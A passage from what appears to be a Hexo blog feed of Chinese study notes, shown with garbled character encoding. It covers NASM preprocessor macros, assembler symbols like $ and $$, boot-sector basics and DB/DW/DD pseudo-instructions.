-NASM-é¢„å¤„ç†"><a href="#ç¬¬å››ç« -NASM-é¢„å¤„ç†" class="headerlink" title="ç¬¬å››ç«  NASM é¢„å¤„ç†"></a>ç¬¬å››ç«  NASM é¢„å¤„ç†</h1><p>é¢„å¤„ç†æŒ‡ä»¤éƒ½æ˜¯ä»¥ä¸€ä¸ª <code>%</code> å¼€å¤´.</p><p>é¢„å¤„ç†å™¨æŠŠæ‰€æœ‰åæ–œæ  <code>\</code> ç»“å°¾çš„è¿ç»­è¡Œåˆå¹¶ä¸ºä¸€è¡Œ:</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">define</span></span> THIS_VERY_LONG_MACRO_NAME_IS_DEFINED_TO \<br>THIS_value<br></code></pre></td></tr></table></figure><p>ä¼šåƒæ˜¯å•ç‹¬ä¸€è¡Œé‚£æ ·æ­£å¸¸å·¥ä½œ.</p><h2 id="4-1-å•è¡Œçš„å®"><a href="#4-1-å•è¡Œçš„å®" class="headerlink" title="4.1 å•è¡Œçš„å®"></a>4.1 å•è¡Œçš„å®</h2><h3 id="4-1-1-æœ€å¸¸ç”¨çš„æ–¹å¼-define"><a href="#4-1-1-æœ€å¸¸ç”¨çš„æ–¹å¼-define" class="headerlink" title="4.1.1 æœ€å¸¸ç”¨çš„æ–¹å¼: %define"></a>4.1.1 æœ€å¸¸ç”¨çš„æ–¹å¼: <code>%define</code></h3><p>å’Œ C ç±»ä¼¼:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">%define ctrl <span class="hljs-number">0</span>x1F &amp;<br>%define param(<span class="hljs-selector-tag">a</span>,<span class="hljs-selector-tag">b</span>) ((<span class="hljs-selector-tag">a</span>)+(<span class="hljs-selector-tag">a</span>)*(<span class="hljs-selector-tag">b</span>))<br></code></pre></td></tr></table></figure><p>ç”¨ <code>%define</code> å®šä¹‰çš„å®æ˜¯å¤§å°å†™æ•æ„Ÿçš„.</p><p>ä½¿ç”¨ <code>%idefine</code> ( i ä»£è¡¨ â€œinsensitiveâ€ )åˆ™æ˜¯å¤§å°å†™ä¸æ•æ„Ÿ. </p><p>å¯ä»¥ <mark>é‡è½½</mark> å•è¡Œå®, é¢„å¤„ç†å™¨èƒ½å¤Ÿé€šè¿‡å‚æ•°çš„ä¸ªæ•°æ¥åŒºåˆ†:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%define</span> foo(<span class="hljs-keyword">x</span>) <span class="hljs-number">1</span>+<span class="hljs-keyword">x</span><br><span class="hljs-variable">%define</span> foo(<span class="hljs-keyword">x</span><span class="hljs-punctuation">,</span>y) <span class="hljs-number">1</span>+<span class="hljs-keyword">x</span>*y<br></code></pre></td></tr></table></figure><p><code>foo(1)</code> ä¼šå˜æˆ <code>1+1</code>.</p><p><code>foo(1,1)</code> ä¼šå˜æˆ <code>1+1*1</code></p><p>ä½†æ˜¯, ä¸€ä¸ªä¸å¸¦å‚æ•°çš„å®å®šä¹‰ä¸å…è®¸å¯¹å®ƒè¿›è¡Œå¸¦æœ‰å‚æ•° çš„é‡å®šä¹‰.</p><p>å‘½ä»¤è¡Œä½¿ç”¨ <code>-d</code> æ¥é¢„å®šä¹‰å®.</p><h3 id="4-1-2-define-çš„å¢å¼ºç‰ˆ-xdefine"><a href="#4-1-2-define-çš„å¢å¼ºç‰ˆ-xdefine" class="headerlink" title="4.1.2 %define çš„å¢å¼ºç‰ˆ: %xdefine"></a>4.1.2 <code>%define</code> çš„å¢å¼ºç‰ˆ: <code>%xdefine</code></h3><p>å…¶å¤§å°å†™ä¸æ•æ„Ÿå½¢å¼ä¸º <code>%xidefine</code></p><p>ç”¨äºå½“ä¸€ä¸ªå®ä¹‹ä¸­æœ‰å…¶ä»–å®å®šä¹‰æ—¶.</p><p>è®©è¿™ä¸ªå®å§‹ç»ˆä¸ºå†…éƒ¨å®åµŒå…¥æ—¶çš„å€¼ï¼Œè€Œä¸æ˜¯å†…éƒ¨å®ä¿®æ”¹åçš„å€¼. </p><h3 id="4-1-3-è¿æ¥å•è¡Œå®çš„ç¬¦å·"><a href="#4-1-3-è¿æ¥å•è¡Œå®çš„ç¬¦å·" class="headerlink" title="4.1.3 è¿æ¥å•è¡Œå®çš„ç¬¦å·: %+"></a>4.1.3 è¿æ¥å•è¡Œå®çš„ç¬¦å·: <code>%+</code></h3><h3 id="4-1-4-å–æ¶ˆå®å®šä¹‰-undef"><a href="#4-1-4-å–æ¶ˆå®å®šä¹‰-undef" class="headerlink" title="4.1.4 å–æ¶ˆå®å®šä¹‰: %undef"></a>4.1.4 å–æ¶ˆå®å®šä¹‰: <code>%undef</code></h3><p>å‘½ä»¤è¡Œä¸º <code>-u</code></p><h3 id="4-1-5-é¢„å¤„ç†å™¨å˜é‡-assign"><a href="#4-1-5-é¢„å¤„ç†å™¨å˜é‡-assign" class="headerlink" title="4.1.5 é¢„å¤„ç†å™¨å˜é‡: %assign"></a>4.1.5 é¢„å¤„ç†å™¨å˜é‡: <code>%assign</code></h3><p>å¤§å°å†™ä¸æ•æ„Ÿå½¢å¼ä¸º <code>%iassign</code>.</p><p>å€¼å¯ä»¥ç”¨è¡¨è¾¾å¼çš„å½¢å¼æŒ‡å®š:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">%assign <span class="hljs-selector-tag">i</span> <span class="hljs-selector-tag">i</span>+<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><code>assign</code> æ˜¯èµ‹å€¼çš„å«ä¹‰, è¿™é‡Œä¹Ÿå°±å¥½åƒèµ‹å€¼, <code>i</code> å±•å¼€çš„å€¼æ˜¯è¡¨è¾¾å¼è®¡ç®—çš„ç»“æœ.</p><h2 id="4-2-å­—ç¬¦ä¸²å¤„ç†å®-strlen-å’Œ-substr"><a href="#4-2-å­—ç¬¦ä¸²å¤„ç†å®-strlen-å’Œ-substr" class="headerlink" title="4.2 å­—ç¬¦ä¸²å¤„ç†å® %strlen å’Œ %substr"></a>4.2 å­—ç¬¦ä¸²å¤„ç†å® <code>%strlen</code> å’Œ <code>%substr</code></h2><h3 id="4-2-1-strlen"><a href="#4-2-1-strlen" class="headerlink" title="4.2.1 %strlen"></a>4.2.1 <code>%strlen</code></h3><p><code>%strlen</code> å®åˆ›å»ºçš„æ•°å€¼æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">%strlen charcnt &#x27;<span class="hljs-keyword">my</span> <span class="hljs-built_in">string</span>&#x27;<br></code></pre></td></tr></table></figure><h3 id="4-2-2-substr"><a href="#4-2-2-substr" class="headerlink" title="4.2.2 %substr"></a>4.2.2 <code>%substr</code></h3><p>ç´¢å¼•å€¼ä¸æ˜¯ 0 å¼€å§‹:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-meta">%</span>substr mychar <span class="hljs-string">&#x27;xyz&#x27;</span> <span class="hljs-number">1</span> ; x<br><span class="hljs-meta">%</span>substr mychar <span class="hljs-string">&#x27;xyz&#x27;</span> <span class="hljs-number">2</span> ; y<br><span class="hljs-meta">%</span>substr mychar <span class="hljs-string">&#x27;xyz&#x27;</span> <span class="hljs-number">3</span> ; z<br></code></pre></td></tr></table></figure><h2 id="4-3-å¤šè¡Œå®-macro"><a href="#4-3-å¤šè¡Œå®-macro" class="headerlink" title="4.3 å¤šè¡Œå®: %macro"></a>4.3 å¤šè¡Œå®: <code>%macro</code></h2><p>å¦‚:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">%macro prologue <span class="hljs-number">1</span><br>    <span class="hljs-keyword">push</span>    <span class="hljs-built_in">ebp</span><br>    <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ebp</span><br>    <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">esp</span>,<span class="hljs-subst">%1</span><br>%endmacro<br></code></pre></td></tr></table></figure><p>è°ƒç”¨:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">myfunc</span>: prologue <span class="hljs-number">12</span><br></code></pre></td></tr></table></figure><p>ç›¸å½“äº:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">myfunc:</span> <span class="hljs-keyword">push</span>    <span class="hljs-built_in">ebp</span><br>        <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ebp</span><br>        <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">esp</span>,%<br></code></pre></td></tr></table></figure><p>å®ååé¢çš„æ•°å­—å®šä¹‰äº†å®å¯ä»¥æ¥æ”¶çš„å‚æ•°çš„ä¸ªæ•°. <code>%1</code> æ˜¯è°ƒç”¨ç¬¬ä¸€ä¸ªå‚æ•°.</p><h3 id="4-3-1-å¤šè¡Œå®çš„é‡è½½"><a href="#4-3-1-å¤šè¡Œå®çš„é‡è½½" class="headerlink" title="4.3.1 å¤šè¡Œå®çš„é‡è½½"></a>4.3.1 å¤šè¡Œå®çš„é‡è½½</h3><h3 id="4-3-2-Macro-Local-Labels"><a href="#4-3-2-Macro-Local-Labels" class="headerlink" title="4.3.2 Macro-Local Labels"></a>4.3.2 Macro-Local Labels</h3><p>NASM å…è®¸ä½ åœ¨å¤šè¡Œå®ä¸­å®šä¹‰ labels, ä½¿å®ƒä»¬å¯¹äºæ¯ä¸€ä¸ªå®è°ƒç”¨æ¥è®²æ˜¯æœ¬åœ°çš„.</p><p>é€šè¿‡åœ¨ label åç§°å‰é¢åŠ ä¸Š <code>%%</code> æ¥å®ç°:</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">macro</span></span> retz 0<br>        jnz %%skip<br>        ret<br><span class="hljs-tag">    %</span>%skip:<br><span class="hljs-tag"></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">endmacro</span></span><br></code></pre></td></tr></table></figure><h3 id="4-3-3-ä¸ç¡®å®šçš„å®å‚æ•°ä¸ªæ•°"><a href="#4-3-3-ä¸ç¡®å®šçš„å®å‚æ•°ä¸ªæ•°" class="headerlink" title="4.3.3 ä¸ç¡®å®šçš„å®å‚æ•°ä¸ªæ•°"></a>4.3.3 ä¸ç¡®å®šçš„å®å‚æ•°ä¸ªæ•°</h3><p>åœ¨ NASM ä¸­æ˜¯é€šè¿‡åœ¨å®çš„ <code>%macro</code> ä¸€è¡Œä¸Šçš„å‚æ•°ä¸ªæ•°åé¢åŠ ä¸Š <code>+</code> æ¥å®ç°.</p><h3 id="4-3-5-0-å®å‚æ•°ä¸ªæ•°è®¡æ•°å™¨"><a href="#4-3-5-0-å®å‚æ•°ä¸ªæ•°è®¡æ•°å™¨" class="headerlink" title="4.3.5 %0: å®å‚æ•°ä¸ªæ•°è®¡æ•°å™¨"></a>4.3.5 <code>%0</code>: å®å‚æ•°ä¸ªæ•°è®¡æ•°å™¨</h3><p><code>%0</code> å…¶è¡¨ç¤ºæœ‰å¤šå°‘ä¸ªå‚æ•°ä¼ ç»™äº†å®.</p><h3 id="4-3-6-rotate-å¾ªç¯ç§»åŠ¨å®å‚æ•°"><a href="#4-3-6-rotate-å¾ªç¯ç§»åŠ¨å®å‚æ•°" class="headerlink" title="4.3.6 %rotate: å¾ªç¯ç§»åŠ¨å®å‚æ•°"></a>4.3.6 <code>%rotate</code>: å¾ªç¯ç§»åŠ¨å®å‚æ•°</h3><p><code>%rotate</code> è®©å®å‚æ•°å¾ªç¯å·¦ç§». å…¶å¯ä»¥åŠ ä¸€ä¸ªå‚æ•°æŒ‡å®šå·¦ç§»çš„æ¬¡æ•°. è´Ÿæ•°å³ç§».</p><h2 id="4-4-æ¡ä»¶æ±‡ç¼–"><a href="#4-4-æ¡ä»¶æ±‡ç¼–" class="headerlink" title="4.4 æ¡ä»¶æ±‡ç¼–"></a>4.4 æ¡ä»¶æ±‡ç¼–</h2><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">if</span></span> &lt;condition1&gt;<br>;<br><span class="hljs-tag">%<span class="hljs-selector-tag">elif</span></span> &lt;condition2&gt;<br>;<br><span class="hljs-tag">%<span class="hljs-selector-tag">else</span></span><br>;<br><span class="hljs-tag">%<span class="hljs-selector-tag">endif</span></span><br></code></pre></td></tr></table></figure><h3 id="4-4-1-ifdef-æµ‹è¯•å•è¡Œå®æ˜¯å¦å­˜åœ¨"><a href="#4-4-1-ifdef-æµ‹è¯•å•è¡Œå®æ˜¯å¦å­˜åœ¨" class="headerlink" title="4.4.1 %ifdef æµ‹è¯•å•è¡Œå®æ˜¯å¦å­˜åœ¨"></a>4.4.1 <code>%ifdef</code> æµ‹è¯•å•è¡Œå®æ˜¯å¦å­˜åœ¨</h3><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">ifdef</span></span><br>;<br><span class="hljs-tag">%<span class="hljs-selector-tag">endif</span></span><br></code></pre></td></tr></table></figure><h3 id="4-4-2-ifmacro-æµ‹è¯•å¤šè¡Œå®æ˜¯å¦å­˜åœ¨"><a href="#4-4-2-ifmacro-æµ‹è¯•å¤šè¡Œå®æ˜¯å¦å­˜åœ¨" class="headerlink" title="4.4.2 %ifmacro æµ‹è¯•å¤šè¡Œå®æ˜¯å¦å­˜åœ¨"></a>4.4.2 <code>%ifmacro</code> æµ‹è¯•å¤šè¡Œå®æ˜¯å¦å­˜åœ¨</h3><h3 id="4-4-7-error-æŠ¥å‘Šç”¨æˆ·è‡ªå®šä¹‰é”™è¯¯"><a href="#4-4-7-error-æŠ¥å‘Šç”¨æˆ·è‡ªå®šä¹‰é”™è¯¯" class="headerlink" title="4.4.7 %error æŠ¥å‘Šç”¨æˆ·è‡ªå®šä¹‰é”™è¯¯"></a>4.4.7 <code>%error</code> æŠ¥å‘Šç”¨æˆ·è‡ªå®šä¹‰é”™è¯¯</h3><p>é¢„å¤„ç†æ“ä½œç¬¦ <code>%error</code> ä¼šè®© NASM æŠ¥å‘Šä¸€ä¸ªåœ¨æ±‡ç¼–æ—¶äº§ç”Ÿçš„é”™è¯¯.</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">ifdef</span></span> SOME_MACRO<br>    ;<br><span class="hljs-tag">%<span class="hljs-selector-tag">elifdef</span></span> SOME_OTHER_MACRO<br>    ;<br><span class="hljs-tag">%<span class="hljs-selector-tag">else</span></span><br><span class="hljs-tag">    %<span class="hljs-selector-tag">error</span></span> Neither SOME_MACRO nor SOME_OTHER_MACRO was defined<br><span class="hljs-tag">%<span class="hljs-selector-tag">endif</span></span><br></code></pre></td></tr></table></figure><h2 id="4-5-é¢„å¤„ç†å™¨å¾ªç¯-rep"><a href="#4-5-é¢„å¤„ç†å™¨å¾ªç¯-rep" class="headerlink" title="4.5 é¢„å¤„ç†å™¨å¾ªç¯: %rep"></a>4.5 é¢„å¤„ç†å™¨å¾ªç¯: <code>%rep</code></h2><p>æ“ä½œç¬¦ <code>%rep</code> å’Œ <code>%endref</code> å¯ä»¥ç”¨æ¥åŒ…å›´ä¸€æ®µä»£ç , ç„¶åè¿™æ®µä»£ç å¯ä»¥è¢«å¤åˆ¶å¤šæ¬¡, æ¬¡æ•°ç”±é¢„å¤„ç†å™¨æŒ‡å®š.</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">assign</span></span> i 0<br><span class="hljs-tag">%<span class="hljs-selector-tag">rep</span></span>    64<br>        inc     word [table+2*i]<br><span class="hljs-tag">%<span class="hljs-selector-tag">assign</span></span> i i+1<br><span class="hljs-tag">%<span class="hljs-selector-tag">endrep</span></span> <br></code></pre></td></tr></table></figure><p>ä¸­é€”å¯ä½¿ç”¨ <code>%exitrep</code> æ“ä½œç¬¦æ¥ç»ˆæ­¢å¾ªç¯.</p><h2 id="4-6-åŒ…å«å…¶ä»–æ–‡ä»¶"><a href="#4-6-åŒ…å«å…¶ä»–æ–‡ä»¶" class="headerlink" title="4.6 åŒ…å«å…¶ä»–æ–‡ä»¶"></a>4.6 åŒ…å«å…¶ä»–æ–‡ä»¶</h2><p>é€šè¿‡ <code>%include</code> å®ç°:</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">%<span class="hljs-meta">include</span> <span class="hljs-string">&quot;macros.mac&quot;</span><br></code></pre></td></tr></table></figure><p>å¯ç”¨ <code>-I</code> å‚æ•°å¢åŠ æœç´¢è·¯å¾„.</p><p>é˜²æ­¢é‡å¤åŒ…å«:</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">ifndef</span></span> MACROS_MAC<br><span class="hljs-tag">    %<span class="hljs-selector-tag">define</span></span> MACROS_MAC<br>    ;<br><span class="hljs-tag">%<span class="hljs-selector-tag">endif</span></span><br></code></pre></td></tr></table></figure><h2 id="4-7-ä¸Šä¸‹æ–‡æ ˆ"><a href="#4-7-ä¸Šä¸‹æ–‡æ ˆ" class="headerlink" title="4.7 ä¸Šä¸‹æ–‡æ ˆ"></a>4.7 ä¸Šä¸‹æ–‡æ ˆ</h2><h2 id="4-8-æ ‡å‡†å®"><a href="#4-8-æ ‡å‡†å®" class="headerlink" title="4.8 æ ‡å‡†å®"></a>4.8 æ ‡å‡†å®</h2><p>NASM å®šä¹‰äº†ä¸€å¥—æ ‡å‡†å®.</p><h3 id="4-8-5-STRUC-å’Œ-ENDSTRUC-å£°æ˜ä¸€ä¸ªç»“æ„ä½“æ•°æ®ç±»å‹"><a href="#4-8-5-STRUC-å’Œ-ENDSTRUC-å£°æ˜ä¸€ä¸ªç»“æ„ä½“æ•°æ®ç±»å‹" class="headerlink" title="4.8.5 STRUC å’Œ ENDSTRUC å£°æ˜ä¸€ä¸ªç»“æ„ä½“æ•°æ®ç±»å‹"></a>4.8.5 <code>STRUC</code> å’Œ <code>ENDSTRUC</code> å£°æ˜ä¸€ä¸ªç»“æ„ä½“æ•°æ®ç±»å‹</h3><h3 id="4-8-6-ISTRUC-AT-å’Œ-IEND-å£°æ˜ç»“æ„ä½“çš„ä¸€ä¸ªå®ä¾‹"><a href="#4-8-6-ISTRUC-AT-å’Œ-IEND-å£°æ˜ç»“æ„ä½“çš„ä¸€ä¸ªå®ä¾‹" class="headerlink" title="4.8.6 ISTRUC, AT å’Œ IEND å£°æ˜ç»“æ„ä½“çš„ä¸€ä¸ªå®ä¾‹"></a>4.8.6 <code>ISTRUC</code>, <code>AT</code> å’Œ <code>IEND</code> å£°æ˜ç»“æ„ä½“çš„ä¸€ä¸ªå®ä¾‹</h3><h1 id="ç¬¬äº”ç« -æ±‡ç¼–å™¨æŒ‡ä»¤"><a href="#ç¬¬äº”ç« -æ±‡ç¼–å™¨æŒ‡ä»¤" class="headerlink" title="ç¬¬äº”ç«  æ±‡ç¼–å™¨æŒ‡ä»¤"></a>ç¬¬äº”ç«  æ±‡ç¼–å™¨æŒ‡ä»¤</h1>]]></content>
    
    
    <categories>
      
      <category>Assembly</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ±‡ç¼–ä¸­çš„ç¾å…ƒç¬¦å·</title>
    <link href="/2022/12/17/%E6%B1%87%E7%BC%96%E4%B8%AD%E7%9A%84%E7%BE%8E%E5%85%83%E7%AC%A6%E5%8F%B7/"/>
    <url>/2022/12/17/%E6%B1%87%E7%BC%96%E4%B8%AD%E7%9A%84%E7%BE%8E%E5%85%83%E7%AC%A6%E5%8F%B7/</url>
    
    <content type="html"><![CDATA[<p><code>$</code> æ˜¯æ±‡ç¼–è¯­è¨€ä¸­çš„ä¸€ä¸ªé¢„å®šä¹‰ç¬¦å·, ç­‰ä»·äºå½“å‰æ­£æ±‡ç¼–åˆ°çš„æ®µçš„å½“å‰åç§»å€¼.</p>]]></content>
    
    
    <categories>
      
      <category>Assembly</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è‡ªå·±åŠ¨æ‰‹å†™æ“ä½œç³»ç»Ÿ-Notes</title>
    <link href="/2022/12/17/%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-Notes/"/>
    <url>/2022/12/17/%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬ä¸€ç« -é©¬ä¸ŠåŠ¨æ‰‹å†™ä¸€ä¸ªæœ€å°çš„-â€œæ“ä½œç³»ç»Ÿâ€"><a href="#ç¬¬ä¸€ç« -é©¬ä¸ŠåŠ¨æ‰‹å†™ä¸€ä¸ªæœ€å°çš„-â€œæ“ä½œç³»ç»Ÿâ€" class="headerlink" title="ç¬¬ä¸€ç«  é©¬ä¸ŠåŠ¨æ‰‹å†™ä¸€ä¸ªæœ€å°çš„ â€œæ“ä½œç³»ç»Ÿâ€"></a>ç¬¬ä¸€ç«  é©¬ä¸ŠåŠ¨æ‰‹å†™ä¸€ä¸ªæœ€å°çš„ â€œæ“ä½œç³»ç»Ÿâ€</h1><p>å½“è®¡ç®—æœºç”µæºè¢«æ‰“å¼€æ—¶, å®ƒä¼šå…ˆè¿›è¡ŒåŠ ç”µè‡ªæ£€ (POST), ç„¶åå¯»æ‰¾å¯åŠ¨ç›˜, å¦‚æœæ˜¯é€‰æ‹©ä»è½¯ç›˜å¯åŠ¨, è®¡ç®—æœºå°±ä¼šæ£€æŸ¥è½¯ç›˜çš„ 0 é¢ 0 ç£é“ 1 æ‰‡åŒº, å¦‚æœå‘ç°å®ƒä»¥ <code>0xAA55</code> ç»“æŸ, åˆ™ BIOS è®¤ä¸ºå®ƒæ˜¯ä¸€ä¸ªå¼•å¯¼æ‰‡åŒº Boot Sector.</p><p>ä¸€ä¸ªæ­£ç¡®çš„ Boot Sector é™¤äº†ä»¥ <code>0xAA55</code> ç»“æŸä¹‹å¤–, è¿˜åº”è¯¥åŒ…å«ä¸€æ®µå°‘äº 512 B çš„æ‰§è¡Œç .</p><p>NASM çš„æ ¼å¼è·Ÿ MASM æ€»ä½“ä¸Šæ˜¯å·®ä¸å¤šçš„, ä½†æœ‰å‡ ç‚¹:</p><ul><li>NASM ä¸­, ä»»ä½•ä¸è¢«æ–¹æ‹¬å· <code>[]</code> æ‹¬èµ·æ¥çš„æ ‡ç­¾æˆ–å˜é‡åéƒ½è¢«è®¤ä¸ºæ˜¯åœ°å€, è®¿é—®æ ‡ç­¾ä¸­çš„å†…å®¹å¿…é¡»ä½¿ç”¨ <code>[]</code></li><li>åœ¨ NASM ä¸­, å˜é‡å’Œæ ‡ç­¾æ˜¯ä¸€æ ·çš„</li></ul><p><code>$</code> è¡¨ç¤ºå½“å‰è¡Œè¢«æ±‡ç¼–åçš„åœ°å€.</p><p><code>$$</code> è¡¨ç¤ºä¸€ä¸ªèŠ‚ (section) çš„å¼€å§‹å¤„è¢«æ±‡ç¼–åçš„åœ°å€, è¿™é‡Œå°±æ˜¯ <code>0x7c09</code> (å¯èƒ½æ˜¯ä¸€æ®µä»£ç å°±æ˜¯ä¸€ä¸ª section)</p><p><code>$-$$</code> è¡¨ç¤ºæœ¬è¡Œè·ç¦»ç¨‹åºå¼€å§‹å¤„çš„ç›¸å¯¹è·ç¦».</p><p><code>times 510-($-$$) DB 0</code> è¡¨ç¤ºç”¨ 0 è¿™ä¸ªå­—èŠ‚é‡å¤ <code>510-($-$$)</code> é, ä¹Ÿå°±æ˜¯åœ¨å‰©ä¸‹çš„ç©ºé—´ä¸­ä¸åœå¡«å…… 0, ç›´åˆ°ç¨‹åºæœ‰ 510B ä¸ºæ­¢. å†åŠ ä¸Šç»“å°¾æ ‡å¿— <code>0xAA55</code> å ç”¨ 2B.</p><h1 id="ç¬¬äºŒç« -æ­å»ºä½ çš„å·¥ä½œç¯å¢ƒ"><a href="#ç¬¬äºŒç« -æ­å»ºä½ çš„å·¥ä½œç¯å¢ƒ" class="headerlink" title="ç¬¬äºŒç«  æ­å»ºä½ çš„å·¥ä½œç¯å¢ƒ"></a>ç¬¬äºŒç«  æ­å»ºä½ çš„å·¥ä½œç¯å¢ƒ</h1><h1 id="ç¬¬ä¸‰ç« -ä¿æŠ¤æ¨¡å¼-Protect-Mode"><a href="#ç¬¬ä¸‰ç« -ä¿æŠ¤æ¨¡å¼-Protect-Mode" class="headerlink" title="ç¬¬ä¸‰ç«  ä¿æŠ¤æ¨¡å¼ (Protect Mode)"></a>ç¬¬ä¸‰ç«  ä¿æŠ¤æ¨¡å¼ (Protect Mode)</h1>]]></content>
    
    
    <categories>
      
      <category>Operate System</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ASCII-å¯¹ç…§è¡¨</title>
    <link href="/2022/12/17/ASCII-%E5%AF%B9%E7%85%A7%E8%A1%A8/"/>
    <url>/2022/12/17/ASCII-%E5%AF%B9%E7%85%A7%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<p><img src="/../img/ASCII_table.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºæ±‡ç¼–ä¸­çš„-DB-DW-DD</title>
    <link href="/2022/12/17/%E5%85%B3%E4%BA%8E%E6%B1%87%E7%BC%96%E4%B8%AD%E7%9A%84-DB-DW-DD/"/>
    <url>/2022/12/17/%E5%85%B3%E4%BA%8E%E6%B1%87%E7%BC%96%E4%B8%AD%E7%9A%84-DB-DW-DD/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq_43068326/article/details/104739016">å‚è€ƒ</a></p><p>è¿™å‡ æ¡æŒ‡ä»¤ç”¨äºåœ¨å†…å­˜ä¸­ä¸“é—¨ç•™å‡ºä¸€äº›ç©ºé—´æ¥ä¿å­˜ä¸´æ—¶æ•°æ®.</p><p><mark>ä¼ªæŒ‡ä»¤</mark>:</p><ul><li>DB, DW, DD å¹¶ä¸æ˜¯å¤„ç†å™¨æŒ‡ä»¤, å®ƒåªæ˜¯ç¼–è¯‘å™¨ææ‡‚å¾—æ±‡ç¼–æŒ‡ä»¤, æ‰€ä»¥ç§°ä½œä¼ªæŒ‡ä»¤ (ä¹Ÿå°±æ˜¯è¯´, è™½ç„¶åœ¨æ±‡ç¼–ä»£ç ä¸­å†™äº† <code>DB</code> è¿™äº›åº”è¯¥åœ¨å…¶ä»–æ±‡ç¼–ä»£ç è¿è¡Œä¹‹å‰å°±å…ˆå¤„ç†äº†)</li><li>ä¼ªæŒ‡ä»¤æ˜¯æ±‡ç¼–æŒ‡ä»¤çš„ä¸€ç§, å®ƒæ²¡æœ‰å¯¹åº”çš„æœºå™¨æŒ‡ä»¤, æ‰€ä»¥å®ƒä¸æ˜¯æœºå™¨æŒ‡ä»¤çš„åŠ©è®°ç¬¦, ä»…ä»…åœ¨ç¼–è¯‘é˜¶æ®µæœ‰ç¼–è¯‘å™¨æ‰§è¡Œ, ç¼–è¯‘æˆåŠŸå, ä¼ªæŒ‡ä»¤å°±æ¶ˆå¤±äº†, æ‰€ä»¥åœ¨ç¨‹åºæ‰§è¡Œæ—¶, ä¼ªæŒ‡ä»¤æ˜¯ä¸ä¼šç”±å¤„ç†å™¨å¤„ç†çš„, å®é™…ä¸Š, ç¨‹åºæ‰§è¡Œæ—¶, ä¼ªæŒ‡ä»¤å·²ç»ä¸å­˜åœ¨</li></ul>]]></content>
    
    
    <categories>
      
      <category>Assembly</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>30å¤©è‡ªåˆ¶æ“ä½œç³»ç»Ÿ-Linux-ç¯å¢ƒä¸‹æ­å»ºç¬”è®°</title>
